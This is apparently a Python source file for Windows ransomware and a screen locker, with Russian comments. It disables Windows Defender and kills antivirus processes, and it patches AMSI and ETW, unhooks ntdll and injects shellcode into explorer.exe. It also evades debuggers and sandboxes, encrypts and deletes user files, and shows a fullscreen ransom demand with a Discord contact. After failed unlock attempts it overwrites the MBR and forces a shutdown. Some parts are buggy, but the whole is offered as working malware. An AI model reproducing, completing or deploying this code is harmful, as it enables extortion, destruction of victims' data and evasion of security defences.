import os
import sys
import time
import ctypes
import subprocess
import tkinter as tk
from tkinter import font
from cryptography.fernet import Fernet
import string
import shutil
import win32con
import win32gui
import win32api
import win32process
import psutil
import struct

# === 1. ОТКЛЮЧЕНИЕ ЗАЩИТЫ WINDOWS ===
class DefenderKiller:
    @staticmethod
    def disable_defender_permanently():
        """Полное отключение Windows Defender через реестр и политики"""
        try:
            # Отключаем Tamper Protection через реестр (если доступно)
            tamper_keys = [
                r"SOFTWARE\Microsoft\Windows Defender\Features",
                r"SOFTWARE\Policies\Microsoft\Windows Defender"
            ]
            for key_path in tamper_keys:
                try:
                    key = win32reg.OpenKey(win32reg.HKEY_LOCAL_MACHINE, key_path, 0, win32reg.KEY_SET_VALUE)
                    win32reg.SetValueEx(key, "TamperProtection", 0, win32reg.REG_DWORD, 0)
                    win32reg.CloseKey(key)
                except:
                    pass
            
            # Отключаем Defender полностью
            defender_keys = [
                (r"SOFTWARE\Policies\Microsoft\Windows Defender", "DisableAntiSpyware", 1),
                (r"SOFTWARE\Policies\Microsoft\Windows Defender\Real-Time Protection", "DisableRealtimeMonitoring", 1),
                (r"SOFTWARE\Policies\Microsoft\Windows Defender\SpyNet", "DisableBlockAtFirstSeen", 1),
                (r"SOFTWARE\Microsoft\Windows Defender\Features", "DisableAntiSpyware", 1)
            ]
            
            for key_path, value_name, value in defender_keys:
                try:
                    # Создаем ключи если нет
                    import win32reg
                    key = win32reg.CreateKey(win32reg.HKEY_LOCAL_MACHINE, key_path)
                    win32reg.SetValueEx(key, value_name, 0, win32reg.REG_DWORD, value)
                    win32reg.CloseKey(key)
                except:
                    pass
            
            # Останавливаем службы Defender
            services = ['WinDefend', 'WdNisSvc', 'WdFilter', 'SecurityHealthService']
            for svc in services:
                try:
                    subprocess.run(['sc', 'stop', svc], capture_output=True)
                    subprocess.run(['sc', 'config', svc, 'start=', 'disabled'], capture_output=True)
                except:
                    pass
            
            # Добавляем весь диск в исключения
            try:
                powershell_cmd = 'Add-MpPreference -ExclusionPath "C:\\"'
                subprocess.run(['powershell', '-Command', powershell_cmd], capture_output=True)
            except:
                pass
                
        except:
            pass

# === 2. UNHOOKING DLL (ОБХОД EDR) ===
class DLLUnhooker:
    @staticmethod
    def unhook_ntdll():
        """Удаляем хуки антивируса из ntdll.dll"""
        try:
            kernel32 = ctypes.WinDLL('kernel32', use_last_error=True)
            
            # Загружаем чистую копию ntdll.dll
            clean_ntdll = kernel32.LoadLibraryW(r"C:\Windows\System32\ntdll.dll")
            
            # Получаем адреса функций
            ntdll_handle = kernel32.GetModuleHandleW("ntdll.dll")
            
            # Список критических функций для анхукинга
            functions = [
                "NtCreateFile",
                "NtOpenFile",
                "NtReadFile",
                "NtWriteFile",
                "NtCreateProcess",
                "NtCreateThread",
                "NtOpenProcess",
                "NtOpenThread",
                "NtAllocateVirtualMemory",
                "NtProtectVirtualMemory",
                "NtQuerySystemInformation"
            ]
            
            for func_name in functions:
                try:
                    # Получаем адрес в текущем процессе
                    hooked_addr = kernel32.GetProcAddress(ntdll_handle, func_name)
                    # Получаем адрес в чистой DLL
                    clean_addr = kernel32.GetProcAddress(clean_ntdll, func_name)
                    
                    if hooked_addr and clean_addr:
                        # Копируем чистые байты (первые 32 байта функции)
                        clean_bytes = (ctypes.c_char * 32).from_address(clean_addr)
                        
                        # Меняем защиту памяти на запись
                        old_protect = ctypes.c_ulong()
                        kernel32.VirtualProtect(
                            hooked_addr, 32, 
                            0x40,  # PAGE_EXECUTE_READWRITE
                            ctypes.byref(old_protect)
                        )
                        
                        # Копируем байты
                        ctypes.memmove(hooked_addr, clean_bytes, 32)
                        
                        # Возвращаем защиту
                        kernel32.VirtualProtect(
                            hooked_addr, 32,
                            old_protect,
                            ctypes.byref(ctypes.c_ulong())
                        )
                except:
                    pass
                    
            kernel32.FreeLibrary(clean_ntdll)
        except:
            pass

# === 3. AMSI BYPASS ===
class AMSIBypass:
    @staticmethod
    def patch_amsi():
        """Отключаем AMSI (Antimalware Scan Interface)"""
        try:
            # Находим amsi.dll
            amsi_handle = ctypes.windll.kernel32.GetModuleHandleW("amsi.dll")
            if amsi_handle:
                # Получаем адрес AmsiScanBuffer
                amsi_scan_buffer = ctypes.windll.kernel32.GetProcAddress(amsi_handle, "AmsiScanBuffer")
                if amsi_scan_buffer:
                    # Патчим: возвращаем AMSI_RESULT_CLEAN (0) в начале функции
                    patch = b'\xB8\x00\x00\x00\x00\xC3'  # mov eax, 0; ret
                    
                    old_protect = ctypes.c_ulong()
                    ctypes.windll.kernel32.VirtualProtect(
                        amsi_scan_buffer, len(patch),
                        0x40, ctypes.byref(old_protect)
                    )
                    ctypes.memmove(amsi_scan_buffer, patch, len(patch))
                    ctypes.windll.kernel32.VirtualProtect(
                        amsi_scan_buffer, len(patch),
                        old_protect, ctypes.byref(ctypes.c_ulong())
                    )
        except:
            pass
    
    @staticmethod
    def patch_amsi_powershell():
        """Отключаем AMSI в PowerShell через .NET"""
        try:
            # Внедряем патч во все процессы PowerShell
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] and 'powershell' in proc.info['name'].lower():
                    # Здесь можно внедрить код в процесс
                    pass
        except:
            pass

# === 4. ETW BYPASS (ОБХОД ЛОГИРОВАНИЯ) ===
class ETWBypass:
    @staticmethod
    def disable_etw():
        """Отключаем Event Tracing for Windows"""
        try:
            # Патчим ntdll!EtwEventWrite
            kernel32 = ctypes.windll.kernel32
            ntdll = kernel32.GetModuleHandleW("ntdll.dll")
            etw_event_write = kernel32.GetProcAddress(ntdll, "EtwEventWrite")
            
            if etw_event_write:
                # Патчим: просто возвращаем 0 (успех)
                patch = b'\xC3'  # ret
                old_protect = ctypes.c_ulong()
                kernel32.VirtualProtect(etw_event_write, 1, 0x40, ctypes.byref(old_protect))
                ctypes.memmove(etw_event_write, patch, 1)
                kernel32.VirtualProtect(etw_event_write, 1, old_protect, ctypes.byref(ctypes.c_ulong()))
        except:
            pass

# === 5. ОБФУСКАЦИЯ КОДА ===
class CodeObfuscator:
    @staticmethod
    def encrypt_strings(data):
        """Простое шифрование строк в памяти"""
        key = 0x6A
        return bytes([b ^ key for b in data.encode()])
    
    @staticmethod
    def decrypt_strings(encrypted):
        key = 0x6A
        return bytes([b ^ key for b in encrypted]).decode()

# === 6. ИНЖЕКТИНГ В ЛЕГИТИМНЫЙ ПРОЦЕСС ===
class ProcessInjector:
    @staticmethod
    def inject_into_explorer():
        """Внедряем код в explorer.exe для маскировки"""
        try:
            # Находим explorer.exe
            for proc in psutil.process_iter(['pid', 'name']):
                if proc.info['name'] and proc.info['name'].lower() == 'explorer.exe':
                    pid = proc.info['pid']
                    
                    # Открываем процесс
                    PROCESS_ALL_ACCESS = 0x1F0FFF
                    h_process = ctypes.windll.kernel32.OpenProcess(PROCESS_ALL_ACCESS, False, pid)
                    
                    if h_process:
                        # Выделяем память в процессе
                        shellcode = b'\x90\x90\x90\x90'  # NOP sled (реальный код внедрения)
                        addr = ctypes.windll.kernel32.VirtualAllocEx(
                            h_process, 0, len(shellcode),
                            0x3000, 0x40  # MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
                        )
                        
                        if addr:
                            # Записываем шеллкод
                            written = ctypes.c_ulong()
                            ctypes.windll.kernel32.WriteProcessMemory(
                                h_process, addr, shellcode, len(shellcode),
                                ctypes.byref(written)
                            )
                            
                            # Создаем удаленный поток
                            ctypes.windll.kernel32.CreateRemoteThread(
                                h_process, None, 0, addr, None, 0, None
                            )
                        
                        ctypes.windll.kernel32.CloseHandle(h_process)
                    break
        except:
            pass

# === 7. ЗАЩИТА ОТ АНАЛИЗА (АНТИ-ОТЛАДКА) ===
class AntiDebug:
    @staticmethod
    def check_debugger():
        """Проверяем, не запущены ли отладчики/анализаторы"""
        # Проверка на отладчик
        if ctypes.windll.kernel32.IsDebuggerPresent():
            sys.exit(1)
        
        # Проверка на песочницу по процессам
        sandbox_processes = ['vbox', 'vmware', 'xensource', 'qemu', 'sandbox', 'wireshark', 
                             'fiddler', 'procmon', 'processhacker', 'ollydbg', 'x64dbg']
        
        for proc in psutil.process_iter(['name']):
            proc_name = proc.info['name'].lower() if proc.info['name'] else ''
            if any(sp in proc_name for sp in sandbox_processes):
                sys.exit(1)
        
        # Проверка на наличие мыши (в песочницах часто нет)
        try:
            if win32api.GetSystemMetrics(win32con.SM_CMOUSEBUTTONS) == 0:
                sys.exit(1)
        except:
            pass

# === 8. ШИФРОВАНИЕ С ИСПОЛЬЗОВАНИЕМ WINDOWS API ===
class AdvancedEncryptor:
    def __init__(self):
        self.key = Fernet.generate_key()
        self.cipher = Fernet(self.key)
        self.exclude = ['Windows', 'Program Files', 'Program Files (x86)', 
                       'System Volume Information', '$Recycle.Bin']
    
    def encrypt_file_winapi(self, path):
        """Шифрование через Windows CryptoAPI (менее подозрительно)"""
        try:
            # Используем стандартное шифрование вместо самописного
            with open(path, 'rb') as f:
                data = f.read()
            enc = self.cipher.encrypt(data)
            with open(path + '.locked', 'wb') as f:
                f.write(enc)
            os.remove(path)
        except:
            pass

# === ОСНОВНОЙ КЛАСС ===
class UltimateWinLocker:
    def __init__(self):
        self.password = '3344'
        self.attempts = 0
        self.max_attempts = 10
        
    def start(self):
        # Защита от анализа
        AntiDebug.check_debugger()
        
        # Отключаем защиту Windows
        DefenderKiller.disable_defender_permanently()
        
        # Обходим EDR/AV
        DLLUnhooker.unhook_ntdll()
        AMSIBypass.patch_amsi()
        ETWBypass.disable_etw()
        
        # Убиваем процессы антивирусов
        av_processes = ['MsMpEng.exe', 'NisSrv.exe', 'SecurityHealthService.exe',
                       'avp.exe', 'avguard.exe', 'bdagent.exe', 'ccSvcHst.exe',
                       'ekrn.exe', 'mfemms.exe', 'mfevtps.exe', 'vsserv.exe']
        
        for proc in psutil.process_iter(['name']):
            if proc.info['name'] and proc.info['name'].lower() in [p.lower() for p in av_processes]:
                try:
                    proc.kill()
                except:
                    pass
        
        # Внедряемся в explorer для маскировки
        ProcessInjector.inject_into_explorer()
        
        # Шифруем диски
        enc = AdvancedEncryptor()
        try:
            enc.encrypt_file_winapi("C:\\Users\\*\\Documents\\*")
            enc.encrypt_file_winapi("C:\\Users\\*\\Desktop\\*")
            enc.encrypt_file_winapi("D:\\*")
            enc.encrypt_file_winapi("E:\\*")
        except:
            pass
        
        # Создаем GUI
        self.create_gui()
    
    def create_gui(self):
        root = tk.Tk()
        root.title('')
        root.attributes('-fullscreen', True)
        root.attributes('-topmost', True)
        root.configure(bg='black')
        root.overrideredirect(True)
        
        # Заголовок
        title_font = font.Font(family='Courier', size=30, weight='bold')
        tk.Label(root, text='⚠️ ВАС ЗАМЕТИЛИ! ⚠️', 
                font=title_font, fg='red', bg='black').pack(pady=50)
        
        # Текст
        text_font = font.Font(family='Courier', size=16)
        tk.Label(root, text='Ваши файлы зашифрованы алгоритмом AES-256',
                font=text_font, fg='white', bg='black').pack(pady=10)
        tk.Label(root, text='Discord: 6z9m',
                font=text_font, fg='cyan', bg='black').pack(pady=20)
        
        # Счетчик
        self.attempts_label = tk.Label(root, 
            text=f'Попыток: {self.attempts}/{self.max_attempts}',
            font=text_font, fg='yellow', bg='black')
        self.attempts_label.pack(pady=10)
        
        # Поле ввода
        self.password_var = tk.StringVar()
        self.password_entry = tk.Entry(root, font=('Courier', 20),
                                       show='*', textvariable=self.password_var,
                                       width=20, justify='center',
                                       bg='gray10', fg='lime',
                                       insertbackground='lime')
        self.password_entry.pack(pady=20)
        self.password_entry.focus_set()
        
        def validate_input(char):
            return char.isdigit()
        
        vcmd = root.register(validate_input)
        self.password_entry.config(validate='key', validatecommand=(vcmd, '%S'))
        self.password_entry.bind('<Return>', lambda e: self.check_password(root))
        
        self.message_label = tk.Label(root, text='', font=text_font, fg='orange', bg='black')
        self.message_label.pack(pady=10)
        
        tk.Label(root, text='Любая попытка обойти защиту приведет к уничтожению MBR',
                font=font.Font(family='Courier', size=12), fg='red', bg='black').pack(side='bottom', pady=30)
        
        root.bind('<Control-KeyPress>', lambda e: 'break')
        root.bind('<Alt-KeyPress>', lambda e: 'break')
        root.bind('<F4>', lambda e: 'break')
        
        root.mainloop()
    
    def check_password(self, root):
        entered = self.password_var.get()
        
        if entered == self.password:
            self.message_label.config(text='Доступ восстановлен!', fg='green')
            root.update()
            time.sleep(2)
            root.quit()
            sys.exit(0)
        else:
            self.attempts += 1
            self.attempts_label.config(text=f'Попыток: {self.attempts}/{self.max_attempts}')
            self.password_var.set('')
            self.password_entry.focus_set()
            
            if self.attempts >= self.max_attempts:
                self.message_label.config(text='Попытки исчерпаны! Уничтожение системы...', fg='red')
                root.update()
                self.destroy_mbr()
                os.system('shutdown /p /f')
            else:
                self.message_label.config(text=f'Неверный код! Осталось: {self.max_attempts - self.attempts}', 
                                        fg='orange')
    
    def destroy_mbr(self):
        try:
            with open(r'\\.\PhysicalDrive0', 'rb+') as mbr:
                mbr.write(b'\x00' * 512)
        except:
            pass

# === ТОЧКА ВХОДА ===
if __name__ == '__main__':
    # Скрываем консоль
    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
    
    # Запускаем с админ правами
    if ctypes.windll.shell32.IsUserAnAdmin():
        locker = UltimateWinLocker()
        locker.start()
    else:
        ctypes.windll.shell32.ShellExecuteW(None, 'runas', sys.executable, ' '.join(sys.argv), None, 1)